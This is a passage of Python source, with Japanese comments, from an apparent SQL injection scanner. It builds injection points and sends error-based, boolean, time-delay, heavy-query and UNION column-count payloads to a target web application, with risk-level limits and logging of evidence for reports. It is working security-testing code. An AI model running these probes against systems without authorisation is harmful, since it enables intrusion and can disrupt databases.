    t.method = (args.method or method or ("POST" if body is not None else "GET")).upper()

    if CFG.level >= 3:          # ヘッダ注入の対象を用意（既にあれば、大文字小文字が違っても足さない）
        if not has_header(t.headers, "Referer"):
            t.headers["Referer"] = cl(t.url)
        if not has_header(t.headers, "X-Forwarded-For"):
            t.headers["X-Forwarded-For"] = "127.0.0.1"
    return t


def json_keys(obj):
    """キー名に含まれる * はマーカーではなく名前の一部なので、元に戻す（注入点にできるのは値だけ）。"""
    if isinstance(obj, dict):
        return {k.replace(MK, CFG.marker): json_keys(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [json_keys(v) for v in obj]
    return obj


def json_leaves(obj, path=()):
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield from json_leaves(v, path + (k,))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from json_leaves(v, path + (i,))
    elif isinstance(obj, (str, int, float)) and not isinstance(obj, bool):
        yield path, obj


def json_set(obj, path, value):
    for k in path[:-1]:
        obj = obj[k]
    obj[path[-1]] = value


def json_clean(obj):
    if isinstance(obj, dict):
        return {k: json_clean(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [json_clean(v) for v in obj]
    if isinstance(obj, str):
        return cl(obj)
    return obj


def build_points(t, only_param):
    """注入点の一覧を作る。マーカー(*)がどこかにあれば、その箇所だけを注入点にする。"""
    cands = []      # (where, key, name, value, 既定で検査するか)

    if MK in t.url:
        cands.append(("PATH", None, "(path)", t.url, False))
    for i, (k, v) in enumerate(t.query):
        cands.append(("GET", i, cl(k), v, True))
    for i, (k, v) in enumerate(t.form):
        cands.append(("POST", i, cl(k), v, True))
    if t.kind == "json":
        for path, v in json_leaves(t.json):
            cands.append(("JSON", path, ".".join(str(p) for p in path), str(v), True))
    if t.kind == "raw":
        cands.append(("BODY", None, "(body)", t.raw, False))
    for i, (k, v) in enumerate(t.cookies):
        cands.append(("COOKIE", i, k, v, CFG.level >= 2))
    for k, v in t.headers.items():
        lk = k.lower()
        if lk.startswith("accept") or lk == "content-type":
            continue
        cands.append(("HEADER", k, k, v, CFG.level >= 3 and lk in ("user-agent", "referer", "x-forwarded-for")))

    t.marker_mode = any(MK in v for _, _, _, v, _ in cands)
    points = []
    for where, key, name, value, default in cands:
        if t.marker_mode:
            if MK not in value:
                continue
            pre, _, post = value.partition(MK)      # マーカーの位置に注入する
        else:
            if not default:
                continue
            pre, post = value, ""
        if only_param and name != only_param:
            continue
        points.append({"where": where, "key": key, "name": name, "pre": pre, "post": cl(post)})
    return points


def null_base(pt):
    """元の行を返さない値（UNION の結果だけを表示させたいときに使う）。"""
    if pt["where"] in ("PATH", "BODY"):
        return None
    return "-1" if re.fullmatch(r"\d*", pt["pre"]) else JUNK


# Cookie に入れるペイロードのエンコード。
#   既定: 空白やカンマ等を %XX にする（PHP / Express / Rails は Cookie の値を URL デコードする）
#   raw : ; と非 ASCII 以外はそのまま（Python / Go / Java 等、Cookie をデコードしない実装向け）
_COOKIE_SAFE = "!#$&'()*+-./:<=>?@[]^_`{|}~\""
_COOKIE_RAW = " !\"#$%&'()*+,-./:<=>?@[\\]^_`{|}~"


def build(pt, payload, base=None):
    """pt の 1 箇所だけ (元値+payload) に差し替えたリクエストを組み立てる。
       返り値: (method, url, headers, body)"""
    w, key = pt["where"], pt["key"]
    val = (pt["pre"] if base is None else base) + payload + pt["post"]

    if w == "PATH":
        url = pt["pre"] + quote(payload, safe="") + pt["post"]
    else:
        url = cl(T.url)
    if T.query:
        url += "?" + join_pairs(T.query, T.query_raw, key if w == "GET" else None, val)

    headers = {}
    for k, v in T.headers.items():
        headers[k] = val if (w == "HEADER" and k == key) else cl(v)
    if T.cookies:
        cs = []
        for i, (k, v) in enumerate(T.cookies):
            if w == "COOKIE" and i == key:
                safe = _COOKIE_RAW if pt.get("raw") else _COOKIE_SAFE
                v = (pt["pre"] if base is None else base) + quote(payload, safe=safe) + pt["post"]
            else:
                v = cl(v)
            cs.append("%s=%s" % (k, v))
        headers["Cookie"] = "; ".join(cs)

    body = None
    if T.kind == "form":
        body = join_pairs(T.form, T.form_raw, key if w == "POST" else None, val)
    elif T.kind == "json":
        obj = json_clean(copy.deepcopy(T.json))
        if w == "JSON":
            json_set(obj, key, val)
        body = json.dumps(obj, ensure_ascii=False)
    elif T.kind == "raw":
        body = val if w == "BODY" else cl(T.raw)
    return T.method, url, headers, body


# ── リクエスト送信 ───────────────────────────────────
class Resp:
    def __init__(self, status, elapsed, body="", location="", timeout=False, error=None, set_cookie=False):
        self.status, self.elapsed, self.body, self.location = status, elapsed, body, location
        self.timeout, self.error = timeout, error
        self.bad = timeout or error is not None     # 判定に使ってはいけない応答
        self.set_cookie = set_cookie
        self.clean = body
        self.fp = None          # (ステータス, リダイレクト先, トークン列)
        self.cnt = None         # トークンの出現回数
        self.req = None         # 証跡用: 送ったリクエスト
        self.ts = None


class _NoCookies(http.cookiejar.CookiePolicy):
    """応答の Set-Cookie を保存しない。保存すると、OR 型が通った瞬間にログイン済みになって以降の真偽が
       区別できなくなる / 1 回目と 2 回目以降でリクエストが変わる、といった形で検査が狂う。"""
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False


_TOK = re.compile(r"[\r\n<>{}\[\],]+")


def strip_reflect(text, payload):
    """応答に反射したペイロードを消す（反射だけで「差がある」と誤判定しないため）。"""
    if not payload or not text:
        return text
    forms = {payload, html.escape(payload), html.escape(payload, quote=False), quote(payload),
             quote_plus(payload), quote(payload, safe=""), json.dumps(payload)[1:-1]}
    for v in sorted(forms, key=len, reverse=True):
        text = text.replace(v, "")
    return text


def _log(pt, payload, ts, method, url, headers, body, resp):
    if not CFG.log:
        return
    CFG.log.write(json.dumps(dict(time=ts, n=CFG.count, point="%s:%s" % (pt["where"], pt["name"]), payload=payload,
                                  method=method, url=url, headers=headers, body=body, status=resp.status,
                                  length=len(resp.body), elapsed=round(resp.elapsed, 3), timeout=resp.timeout,
                                  error=resp.error), ensure_ascii=False) + "\n")
    CFG.log.flush()


def send(pt, payload, base=None):
    payload = tamper(payload)
    method, url, headers, body = build(pt, payload, base)
    data = body.encode("utf-8", "surrogateescape") if body is not None else None
    resp, waited = None, False
    ts = datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")
    attempt = 0
    while attempt <= CFG.retries:
        attempt += 1
        if CFG.delay:
            time.sleep(CFG.delay)
        CFG.count += 1
        t0 = time.time()
        try:
            r = SESSION.request(method, url, headers=headers, data=data,
                                timeout=CFG.timeout, verify=False, allow_redirects=False)
            resp = Resp(r.status_code, time.time() - t0, r.text, r.headers.get("Location", ""),
                        set_cookie="Set-Cookie" in r.headers)
            _log(pt, payload, ts, method, url, headers, body, resp)     # 送り直しも含め、1 回の送信につき 1 行
            if r.status_code == 429 and not waited:     # レート制限: 一度だけ待って送り直す
                waited = True
                try:
                    wait = min(max(float(r.headers.get("Retry-After", 3)), 0), 15)
                except ValueError:
                    wait = 3
                time.sleep(wait)
                attempt -= 1
                continue
            break
        except requests.exceptions.Timeout:
            resp = Resp(0, time.time() - t0, timeout=True)
            _log(pt, payload, ts, method, url, headers, body, resp)
            break                                    # タイムアウトは再送しない
        except (requests.exceptions.RequestException, UnicodeError, ValueError) as e:
            resp = Resp(-1, time.time() - t0, error=str(e))
            _log(pt, payload, ts, method, url, headers, body, resp)
    resp.clean = strip_reflect(resp.body, payload)
    toks = tuple(x.strip() for x in _TOK.split(resp.clean) if x.strip())
    resp.fp = (resp.status, strip_reflect(resp.location, payload), toks)
    resp.cnt = Counter(toks)
    resp.req = dict(method=method, url=url, headers=headers, body=body)
    resp.ts = ts
    if resp.status in WAF_STATUS:
        CFG.blocked += 1
    if CFG.verbose:
        tag = "TIMEOUT" if resp.timeout else ("ERR" if resp.error else str(resp.status))
        print("    %s#%-4d %-7s len=%-6d %5.2fs  %s%s" % (B, CFG.count, tag, len(resp.body), resp.elapsed,
                                                       repr((base or "") + payload), N))
    return resp


def detect_dbs(text):
    return [name for name, rx in ERROR_SIGNATURES if rx.search(text or "")]


def token_dist(a, b):
    return sum(((a.cnt - b.cnt) + (b.cnt - a.cnt)).values())


def cond_payload(pre, op, cond, suf):
    """境界に条件式を差し込む。op が空なら式コンテキスト（CASE WHEN の中など）。"""
    return pre + ((" %s " % op) if op else "") + cond + suf


def evidence(r, db=None):
    """報告書の根拠にできる形で、送ったリクエストと応答の要点を残す（応答は加工せずそのまま切り出す）。"""
    snip = r.body[:300]
    if db:
        m = dict(ERROR_SIGNATURES)[db].search(r.body)
        if m:
            snip = r.body[max(0, m.start() - 80):m.end() + 200]
    return dict(time=r.ts, request=r.req, status=r.status, length=len(r.body), elapsed=round(r.elapsed, 2),
                location=r.location, snippet=snip)


# ── 注入点ごとの検査状態 ─────────────────────────────
class Ctx:
    def __init__(self, pt):
        self.pt = pt
        self.base = None
        self.thr = 0            # ベースライン同士の揺れ（これ以下の差は「同じ」）
        self.base_time = 0.0
        self.base_dbs = set()   # 元からエラー文が出ている場合は差し引く
        self.dbms = CFG.dbms
        self.quote = None       # ' か " のどちらで壊れたか
        self.numeric = False    # ' でも '' でも壊れる（= 文字列の中ではない）
        self.bound = None       # (接頭辞, 接尾辞, AND/OR/""): boolean・error-based で使う境界
        self.tbound = None      # time で遅延した境界 (接頭辞, 接尾辞, op)
        self.sprefix = None     # 値を閉じる接頭辞。この後ろに「 UNION ...-- -」「;文-- -」を続けられる
        self.stack = False
        self.union = None
        self.heavy = None       # 重い処理で検出したとき (DBMS, 式, n, 実測秒)
        self.tref = None        # boolean の「真」応答（UNION の基準に使う）
        self.floor = {}         # MySQL の文字列の式: クォート → 構文が通った括弧の深さ（これより浅い形は送らない）
        self.kinds = set()      # 検出できた手法
        self.strong = False     # 確定と言える根拠があるか（boolean / time / union / DBMS 固有のエラー文）
        self.hits = []          # JSON 出力用

    def differ(self, a, b):
        """2 つの応答が「意味のある差」を持つか。"""
        if CFG.string:
            return (CFG.string in a.body) != (CFG.string in b.body)
        if a.fp[0] != b.fp[0] or a.fp[1] != b.fp[1]:      # ステータス / リダイレクト先
            return True
        if self.thr == 0:                                 # 静的ページ: 並び順・重複まで含めて完全一致で比べる
            return a.fp[2] != b.fp[2]
        return token_dist(a, b) > self.thr

    def same_rows(self, a, b):
        """行の並び順だけが違う応答を「同じ」とみなす（ORDER BY n が通ったかどうかの判定用）。"""
        return a.fp[0] == b.fp[0] and a.fp[1] == b.fp[1] and token_dist(a, b) <= self.thr

    def new_db(self, r):
        """ベースラインには無かった DBMS エラーが出ていれば、その名前。"""
        for name in detect_dbs(r.clean):
            if name not in self.base_dbs:
                return name
        return None

    def set_dbms(self, name):
        if name and name != "Generic" and not self.dbms:
            self.dbms = name

    def hit(self, kind, strong=True, **kw):
        self.kinds.add(kind)
        self.strong = self.strong or strong
        self.hits.append(dict(type=kind, **kw))

    def confirmed(self):
        return bool(self.kinds & {"BOOL", "TIME", "UNION"})


def baseline(ctx):
    rs = [send(ctx.pt, "") for _ in range(4)]   # 中身が毎回変わるページでも、たまたま同じ内容が続くことがある
    if any(r.bad for r in rs):
        r = next(r for r in rs if r.bad)
        print("  %s[!] ベースラインの取得に失敗（%s）。この注入点はスキップ。%s"
              % (R, "timeout" if r.timeout else r.error, N))
        return False
    noise = max(token_dist(a, b) for a in rs for b in rs)
    if noise:               # 動的ページ: 3 回では揺れ幅を小さく見積もりやすいので、追加で取ってから閾値を決める
        more = [send(ctx.pt, "") for _ in range(4)]
        rs += [r for r in more if not r.bad]
        noise = max(token_dist(a, b) for a in rs for b in rs)
    ctx.base = rs[0]
    ctx.thr = noise + noise // 2
    ctx.base_time = max(r.elapsed for r in rs)
    ctx.base_dbs = set(detect_dbs(rs[0].clean))
    if ctx.base.status in WAF_STATUS:
        print("  %s[!] 元のリクエスト自体が HTTP %d です。遮断・レート制限中の可能性が高く、この注入点の結果"
              "（検出なしも含む）は当てになりません。時間を置くか --delay / --proxy で確認してください。%s"
              % (R, ctx.base.status, N))
    if len({r.fp[0] for r in rs}) > 1:
        print("  %s[!] 同じリクエストでステータスが揺れています。boolean の結果は要注意。%s" % (Y, N))
    elif noise:
        print("  %s[i] 動的ページ（揺れ %d トークン）。確認回数を増やして判定します。--string で真の目印を"
              "指定するとより確実。%s" % (Y, noise, N))
    if any(r.set_cookie for r in rs) and not CFG.cookie_note:
        CFG.cookie_note = True
        print("  %s[i] 対象が Set-Cookie を返しています。sqljr は受け取った Cookie を次のリクエストに付けません"
              "（検査の途中でログイン状態などが変わるのを防ぐため）。セッションが要るページは -c で渡してください。%s"
              % (Y, N))
    return True


# ── 1) error-based ───────────────────────────────────
def test_error(ctx):
    seen, found = {}, {}
    for pl in ERROR_PROBES:
        if pl in ERROR_PROBES_CUT and not allow_comment():
            continue
        r = send(ctx.pt, pl)
        seen[pl] = r
        if r.bad:
            continue
        db = ctx.new_db(r)
        if db:
            found.setdefault(db, []).append((pl, r))
    if len(found) > 1:
        found.pop("Generic", None)      # DBMS を特定できたなら、汎用の文言での一致は重ねて報告しない
    for db, hits in found.items():
        pls = [pl for pl, _ in hits]
        ctx.set_dbms(db)
        for pl, r in hits:
            ctx.hit("ERROR", strong=(db != "Generic"), payload=tamper(pl), dbms=db, evidence=evidence(r, db))
        if db == "Generic":
            print("  %s[ERROR ]%s エラーらしき文言（DBMS 不明。SQL 由来とは限らないので「可能性」扱い） ← %s"
                  % (Y, N, " ".join(repr(tamper(x)) for x in pls)))
        else:
            print("  %s[ERROR ]%s %s のエラー露出 ← %s" % (G, N, db, " ".join(repr(tamper(x)) for x in pls)))
    for q in ("'", "\""):
        r1 = seen.get(q)
        if not r1 or r1.bad:
            continue
        if ctx.new_db(r1):
            # q で壊れて qq で直るなら、その q が文字列の閉じ。両方壊れるなら数値コンテキスト
            r2 = send(ctx.pt, q + q)
            if not r2.bad and not ctx.new_db(r2):
                ctx.quote = ctx.quote or q
            elif not r2.bad and q == "'":
                ctx.numeric = True
            continue
        # エラー文が出なくても「' で壊れて '' で直る」なら注入の可能性が高い（WAF の遮断は除外）
        if r1.status == ctx.base.status or r1.status in WAF_STATUS:
            continue
        r2 = send(ctx.pt, q + q)
        if not r2.bad and r2.status == ctx.base.status:
            r3 = send(ctx.pt, q)        # 一過性のエラー（対象側の接続失敗など）を拾わないよう、もう一度壊れることを確かめる
            if r3.bad or r3.status != r1.status:
                continue
            ctx.quote = ctx.quote or q
            ctx.hit("QUOTE", strong=False, payload=q, status=r1.status, evidence=evidence(r1))
            print("  %s[QUOTE ]%s %s で HTTP %d、%s で HTTP %d に戻る → クォートが SQL に届いている可能性大"
                  % (G, N, repr(q), r1.status, repr(q + q), r2.status))


# ── 2) boolean-based ─────────────────────────────────
def ordered_bounds(ctx):
    bs = [b for b in BOUNDARIES if b[1] != "#" or ctx.dbms in (None, "MySQL")]
    if ctx.quote:           # エラーで壊れたクォートを先に試す
        bs.sort(key=lambda b: not b[0].startswith(ctx.quote))
    return bs


def allow_comment():
    """後続の SQL を消す / 文を区切るペイロード（-- - / # / ; / ORDER BY / UNION / スタック）と、
       値の位置で中立にならない素の AND を送ってよいか。
       UPDATE や DELETE に届くと狙った行以外に効くので、既定では参照系とみなせる GET だけ。"""
    return CFG.risk >= 2 or T.method in ("GET", "HEAD")


def expr_bounds(ctx):
    """式コンテキストの境界 (接頭辞, 接尾辞) を、当たりそうな順に返す。"""
    out = []
    for d, kind, pre, suf, safe in EXPR_BOUNDS:
        if d is None:
            ok = ctx.dbms not in ("Oracle", "SQLite")       # SQLite は複数行の副問い合わせがエラーにならない
        else:
            ok = ctx.dbms in (None, d)
        if ok and (safe or allow_comment()):
            out.append((kind, pre, suf))
    first = "str" if ctx.quote == "'" else ("num" if ctx.numeric else None)
    out.sort(key=lambda e: e[0] != first)                   # 安定ソート: 種別の合うものを前へ
    return [(pre, suf) for _, pre, suf in out]


def mysql_str_bounds(ctx):
    """GET 以外・--risk 1 用の MySQL 文字列の境界を (接頭辞, 接尾辞, クォート) で返す。深い括弧から順。"""
    bs = [(pre, suf, MYSQL_DEPTH[pre][0]) for pre, suf in MYSQL_STR_BOUNDS if ctx.dbms in (None, "MySQL")]
    if ctx.quote:
        bs.sort(key=lambda b: b[2] != ctx.quote)
    return bs


def bool_candidates(ctx):
    """(接頭辞, 接尾辞, op, 組)。AND → OR（--risk 2 のみ）→ 式コンテキストの順。
       GET 以外・--risk 1 では AND 型を送らない。AND は値が比較の直接の相手でないと真偽値（0 / 1）に化け、
         DELETE ... WHERE id IN (3 AND 1=1)        →  IN (1)
         DELETE ... WHERE id IN (ABS(3) AND 1=1 AND (7=7))
         DELETE ... WHERE id IN ('3' AND 1=1 AND 'a'='a')
       のように別の ID の行に効くため。数値・文字列・並びの位置は「値を変えない式」だけで調べる。
       「組」は MYSQL_STR_BOUNDS のクォート文字。同じ組は深い括弧から順に並んでいて、途中で打ち切ることがある。"""
    if not allow_comment():
        for pre, suf, q in mysql_str_bounds(ctx):
            yield pre, suf, "", q
        for pre, suf in expr_bounds(ctx):
            yield pre, suf, "", None
        return
    bounds = ordered_bounds(ctx)
    for pre, suf in bounds:
        yield pre, suf, "AND", None
    if CFG.risk >= 2:       # OR は UPDATE / DELETE の WHERE に入ると全行に効くので既定では送らない
        for pre, suf in bounds:
            yield pre, suf, "OR", None
    for pre, suf in expr_bounds(ctx):
        yield pre, suf, "", None


def safe_guess(d, numeric, quote):
    """GET 以外・--risk 1 で境界が未確定のまま提示するときの閉じ方。ツール自身が送るのと同じ「値を変えない」形にする。"""
    if not numeric and d == "MySQL":
        pre, suf = MYSQL_STR_BOUNDS[5 if quote == '"' else 2]       # 括弧を閉じない形
        return pre, suf, ""
    kind = "num" if numeric else "str"
    for want in (d, None):
        for dd, k, pre, suf, safe in EXPR_BOUNDS:
            if dd == want and k == kind and safe:
                return pre, suf, ""
    return MYSQL_STR_BOUNDS[2][0], MYSQL_STR_BOUNDS[2][1], ""


def test_boolean(ctx):
    pt = ctx.pt
    # 動的ページでは偶然の差で 1 回分の確認を通り抜けることがあるので、確認の回数を増やす
    rounds = NUMS[1:3] if ctx.thr == 0 else NUMS[1:5]
    blocked = lambda r: r.status in WAF_STATUS and r.status != ctx.base.status
    # MySQL 用の文字列の式（MYSQL_STR_BOUNDS）は「構文として通った深さ」で打ち切る。そのために、クォートで
    # 構文を壊したときの応答を先に取っておく。壊しても応答が変わらない（エラーが見えない）なら、条件が偽のときの
    # エラーも見えず真偽の差は出ないので、その組は送らない
    err_ref, closed = {}, set()

    def broken(q, r):
        """r は「構文エラーのときの応答」に見えるか。"""
        e = err_ref[q]
        return bool(ctx.new_db(r)) or (r.fp[0] != ctx.base.fp[0] and r.fp[0] == e.fp[0]) or not ctx.differ(r, e)

    for pre, suf, op, group in bool_candidates(ctx):
        if group:
            if group not in err_ref:
                e = err_ref[group] = send(pt, group)
                if e.bad or not (ctx.new_db(e) or ctx.differ(e, ctx.base)):
                    closed.add(group)
            if group in closed:
                continue
        mk = lambda a, b: cond_payload(pre, op, "%d=%d" % (a, b), suf)
        t1, f1 = send(pt, mk(NUM_A, NUM_A)), send(pt, mk(NUM_A, NUM_A + 1))
        if group and not t1.bad and not broken(group, t1):
            closed.add(group)       # この深さで構文が通った。これより浅い形は値の位置に入ってしまうので送らない
            ctx.floor[group] = MYSQL_DEPTH[pre][1]
        if t1.bad or f1.bad or blocked(t1) or blocked(f1) or not ctx.differ(t1, f1):
            continue        # 片方だけ WAF に遮断された差は、SQL の真偽による差ではない
        # 別の数字でもう一度。真同士・偽同士が一致して初めて確定（偶然の差を排除）
        ok = True
        for n in rounds:
            t2, f2 = send(pt, mk(n, n)), send(pt, mk(n, n + 1))
            if t2.bad or f2.bad or ctx.differ(t1, t2) or ctx.differ(f1, f2) or not ctx.differ(t2, f2):
                ok = False
                break
        if not ok:
            continue
        ctx.bound = (pre, suf, op)
        if op:
            ctx.sprefix = pre
        ctx.tref = t1 if (op == "AND" and suf in ("", "-- -", "#")) else None
        tp, fp = tamper(mk(NUM_A, NUM_A)), tamper(mk(NUM_A, NUM_A + 1))
        ctx.hit("BOOL", true=tp, false=fp, context="expression" if not op else op,
                evidence_true=evidence(t1), evidence_false=evidence(f1))
        print("  %s[BOOL  ]%s 真=%s (HTTP %d, %dB) / 偽=%s (HTTP %d, %dB) で応答差%s"
              % (G, N, repr(tp), t1.status, len(t1.body), repr(fp), f1.status, len(f1.body),
                 "（式コンテキスト: 値を変えない式を埋め込み、偽のときだけ SQL エラーにする形）" if not op else ""))
        if not ctx.dbms:        # エラーが出ない環境向け: DBMS 固有の真式で特定
            for name, expr in FINGERPRINTS:
                r = send(pt, cond_payload(pre, op, expr, suf))
                if not r.bad and not ctx.differ(r, t1) and ctx.differ(r, f1):
                    ctx.set_dbms(name)
                    print("  %s[DBMS  ]%s %s が真 → %s" % (G, N, expr, name))
                    break
        return


# ── 3) time-based ────────────────────────────────────
def hms(t):
    return "%d:%d:%d" % (t // 3600, t % 3600 // 60, t % 60)


def fmt_core(core, t):
    return core.format(t=t, hms=hms(t), al=ALIAS)


def time_bounds(ctx):
    """WHERE 型（AND / OR）の境界の候補。"""
    quick = []
    if allow_comment():     # GET 以外・--risk 1 では素の AND もコメントも使わない（式コンテキストだけで調べる）
        quick = [(p, "-- -" if p else "", "AND") for p in QUICK_PREFIXES]
        if ctx.quote:
            quick.sort(key=lambda b: not b[0].startswith(ctx.quote))
        if CFG.risk >= 2:
            quick += [(p, s, "OR") for p, s, _ in list(quick)]
    if ctx.bound and ctx.bound[2]:
        return [ctx.bound]
    if ctx.bound:           # 式コンテキストで見つかっている: まずそれ。MSSQL のスタックは WHERE 型でしか試せない
        return [ctx.bound] + quick
    return quick


def time_candidates(ctx):
    """(dbms, 手法, t を受け取ってペイロードを返す関数, 境界) を優先順に返す。"""
    dbs = [ctx.dbms] if ctx.dbms in TIME_CORES else ([] if ctx.dbms else list(TIME_CORES))
    seen = set()

    def make(d, kind, core, pre, suf, op):
        if kind == "stack":
            # スタッククエリは MSSQL（WAITFOR が唯一の遅延手段）以外では --risk 2 のときだけ。
            # 末尾をコメントで消すので、コメントを送れない状況でも使わない
            if op == "" or not allow_comment() or not (d == "MSSQL" or CFG.risk >= 2):
                return None
            fn = lambda t: "%s%s-- -" % (pre, fmt_core(core, t))
            bound = (pre, "-- -", "AND")
        else:
            fn = lambda t: cond_payload(pre, op, fmt_core(core, t), suf)
            bound = (pre, suf, op)
        if fn(1) in seen:
            return None
        seen.add(fn(1))
        return d, kind, fn, bound

    for pre, suf, op in time_bounds(ctx):
        for d in dbs:
            for kind, core in TIME_CORES[d]:
                c = make(d, kind, core, pre, suf, op)
                if c:
                    yield c
    if not ctx.bound:           # INSERT / UPDATE の値、数値の位置、ORDER BY に埋め込む形
        for d in dbs:
            inline = [core for kind, core in TIME_CORES[d] if kind == "inline"]
            for pre, suf in TIME_EXPR_BOUNDS.get(d, []) if inline else []:
                c = make(d, "inline", inline[0], pre, suf, "")
                if c:
                    yield c


def test_time(ctx):
    pt, S = ctx.pt, CFG.sleep
    slow = lambda r: (not r.bad) and r.elapsed >= ctx.base_time + S * 0.8
    timeouts, found = 0, False
    for d, kind, fn, bound in time_candidates(ctx):
        qd = MYSQL_DEPTH.get(bound[0])
        if qd and qd[1] < ctx.floor.get(qd[0], -1):
            continue            # MySQL の文字列の式: 構文が通ると分かった深さより浅い形は送らない
        r = send(pt, fn(S))
        if r.timeout:
            timeouts += 1
            continue
        if not slow(r):
            continue
        if qd:                  # 遅延した = この深さで構文が通った（確認に失敗しても、これより浅い形には進まない）
            ctx.floor[qd[0]] = max(ctx.floor.get(qd[0], -1), qd[1])
        # 対照（0 秒）が速く、もう一度送って再び遅い → 確定
        c = send(pt, fn(0))
        if c.bad or c.elapsed >= ctx.base_time + S * 0.5:
            continue
        r2 = send(pt, fn(S))
        if not slow(r2):
            continue
        ctx.set_dbms(d)
        ctx.bound = ctx.bound or bound
        ctx.tbound = bound
        if kind == "stack":
            ctx.stack = True
        if bound[2] and bound[1] in ("-- -", "#"):
            ctx.sprefix = bound[0] if ctx.sprefix is None else ctx.sprefix
        ctx.hit("TIME", payload=tamper(fn(S)), dbms=d, elapsed=round(r2.elapsed, 1),
                control_elapsed=round(c.elapsed, 1), stacked=(kind == "stack"), evidence=evidence(r2))
        print("  %s[TIME  ]%s %s → %.1fs 遅延 / 対照(0秒) %.1fs（%s%s）"
              % (G, N, repr(tamper(fn(S))), r2.elapsed, c.elapsed, d, "・スタッククエリ可" if kind == "stack" else ""))
        found = True
        break
    if not found:
        found, n = test_heavy(ctx)
        timeouts += n
    if timeouts:
        print("  %s[!] time 検査中に %d 回タイムアウト。遅延ではなく無応答なのでヒット扱いにしていません。対象側で"
              "重い処理が走り続けている可能性があります（--timeout を伸ばすか対象の状態を確認）。%s" % (Y, timeouts, N))
    elif not found and ctx.dbms == "Oracle" and ctx.kinds:
        print("  %s[i] Oracle の time は未検出。DBMS_PIPE は一般ユーザに実行権限が無いことが多く、その場合は"
              "重い問い合わせ（ALL_USERS の直積）で代用していますが、対象が速いと閾値に届きません。%s" % (Y, N))


def test_heavy(ctx):
    """sleep 関数が無い（SQLite）/ 権限が無い（Oracle の DBMS_PIPE）場合: 重い処理で遅延させる。
       小さい負荷から順に上げ、対照（n=1）が速いこと・もう一度送って再び遅いことを確かめる。
       返り値: (検出したか, タイムアウト数)"""
    pt = ctx.pt
    heavy = lambda r: (not r.bad) and r.elapsed >= ctx.base_time + 0.5
    for d in ("SQLite", "Oracle"):
        if ctx.dbms not in (None, d):
            continue
        steps = HEAVY[d] + (HEAVY_RISK2.get(d, []) if CFG.risk >= 2 else [])
        bounds = list(time_bounds(ctx))
        if not ctx.bound:
            bounds += [(p, s, "") for p, s in TIME_EXPR_BOUNDS[d]]
        for pre, suf, op in bounds:
            for tmpl, size in steps:
                fn = lambda n: cond_payload(pre, op, "1=" + tmpl.format(n=n), suf)
                r = send(pt, fn(size))
                if r.timeout:
                    return False, 1     # 対象で重い処理が走り続けている恐れ。これ以上の負荷は送らない
                if not heavy(r):
                    continue
                c = send(pt, fn(1))
                if c.bad or c.elapsed >= ctx.base_time + 0.25:
                    break
                r2 = send(pt, fn(size))
                if not heavy(r2):
                    break
                # その DBMS 固有の式が真のときだけ遅延するなら DBMS も確定（WITH RECURSIVE は他の DBMS にもある）
                fpx = dict(FINGERPRINTS)[d]
                r3 = send(pt, cond_payload(pre, op, HEAVY_TIMEB.format(cond=fpx, heavy=tmpl.format(n=size)), suf))
                if heavy(r3):
                    ctx.set_dbms(d)
                ctx.bound = ctx.bound or (pre, suf, op)
                ctx.tbound = (pre, suf, op)
                if op and suf in ("-- -", "#") and ctx.sprefix is None:
                    ctx.sprefix = pre
                ctx.heavy = (d, tmpl, size, r2.elapsed)
                ctx.hit("TIME", payload=tamper(fn(size)), dbms=(ctx.dbms or d), elapsed=round(r2.elapsed, 1),
                        control_elapsed=round(c.elapsed, 1), stacked=False, heavy=True, evidence=evidence(r2))
                print("  %s[TIME  ]%s %s → %.1fs 遅延 / 対照(n=1) %.1fs（%s・重い処理。sleep 関数は使えず）"
                      % (G, N, repr(tamper(fn(size))), r2.elapsed, c.elapsed,
                         ctx.dbms or "%s 形式（DBMS は未確定）" % d))
                return True, 0
    return False, 0


# ── 4) union-based（列数と表示列まで。抽出はしない）──
def concat_variants(dbms):
    a = "'%s'" % TAG
    if dbms == "MySQL":
        return ["CONCAT(" + a + ",'%s')"]
    if dbms == "MSSQL":
        return [a + "+'%s'"]
    if dbms in ("PostgreSQL", "Oracle", "SQLite"):
        return [a + "||'%s'"]
    return ["CONCAT(" + a + ",'%s')", a + "||'%s'"]


def union_froms(ctx):
    return [" FROM DUAL"] if ctx.dbms == "Oracle" else ([""] + ([" FROM DUAL"] if not ctx.dbms else []))


def union_cols_orderby(ctx, pre, cm):
    """ORDER BY n が通る最大の n（= 列数）。分からなければ None。
       並び替えで行の順番が変わるのは「通った」うちなので、順番を無視して比べる。"""
    order = lambda n: send(ctx.pt, "%s ORDER BY %d%s" % (pre, n, cm))
    r1 = order(1)
    # ORDER BY 1 は元（または boolean の真）と同じ行、ORDER BY 9999 は別の応答になるはず
    if r1.bad or ctx.new_db(r1):
        return None
    if not (ctx.same_rows(r1, ctx.base) or (ctx.tref and ctx.same_rows(r1, ctx.tref))):
        return None
    rbig = order(9999)
    if rbig.bad or not (ctx.new_db(rbig) or not ctx.same_rows(rbig, r1)):
        return None
    ok = lambda n: (lambda r: not r.bad and not ctx.new_db(r) and ctx.same_rows(r, r1))(order(n))
    lo, hi, n = 1, None, 2
    while n <= 64:                      # 倍々で上限を探してから二分探索
        if ok(n):
            lo, n = n, n * 2
        else:
            hi = n
            break
    if hi is None:
        return None
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if ok(mid):
            lo = mid
        else:
            hi = mid
    return lo


def union_verify(ctx, pre, cm, cols):
    """「UNION ALL SELECT NULL×cols」は通り、cols±1 では通らないことを確かめる（ORDER BY の挙動だけで
       UNION 可と言わないため）。確認できたら True。"""
    for frm in union_froms(ctx):
        sel = lambda n: send(ctx.pt, "%s UNION ALL SELECT %s%s%s" % (pre, ",".join(["NULL"] * n), frm, cm))
        good = sel(cols)
        if good.bad or ctx.new_db(good):
            continue
        wrong = [sel(cols + 1), sel(cols - 1 if cols > 1 else cols + 2)]
        again = sel(cols)
        if again.bad or any(w.bad for w in wrong):
            continue
        # 正しい列数は 2 回とも同じ応答、違う列数は 2 つとも同じ応答（エラー）で、両者は別物。
        # 内容がランダムに変わるだけのページは、この 3 条件を同時には満たさない
        if (not ctx.differ(good, again) and not ctx.differ(wrong[0], wrong[1])
